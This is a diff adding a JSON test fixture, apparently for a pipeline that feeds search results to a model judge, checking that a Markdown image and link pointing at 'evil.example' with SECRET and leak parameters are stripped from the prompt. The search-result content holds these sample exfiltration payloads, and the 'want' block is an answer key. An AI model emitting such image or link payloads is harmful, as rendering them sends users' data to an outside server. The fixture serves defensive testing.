@@ -1,0 +1,33 @@
+{
+  "_comment": "A Markdown image pointing at an attacker's server, and a link whose target carries data. Images go, links keep only their text.",
+  "results": [
+    {
+      "title": "Acme pricing",
+      "url": "https://acme.example/pricing",
+      "content": "Pro plan: $59 per month. ![x](https://evil.example/log?q=SECRET) See [the plans](https://evil.example/?d=leak).",
+      "score": 0.9,
+      "published_date": "2026-10-30"
+    }
+  ],
+  "judge": {
+    "verdict": "CONTRADICTS",
+    "current_value": "$59 per month",
+    "quote": "Pro plan: $59 per month.",
+    "source": 1,
+    "once_true": false,
+    "history_quote": "",
+    "history_source": 0,
+    "other_quote": "",
+    "other_source": 0
+  },
+  "want": {
+    "verdict": "CONTRADICTED",
+    "flagged": [],
+    "prompt_excludes": [
+      "evil.example"
+    ],
+    "prompt_includes": [
+      "See the plans."
+    ]
+  }
+}
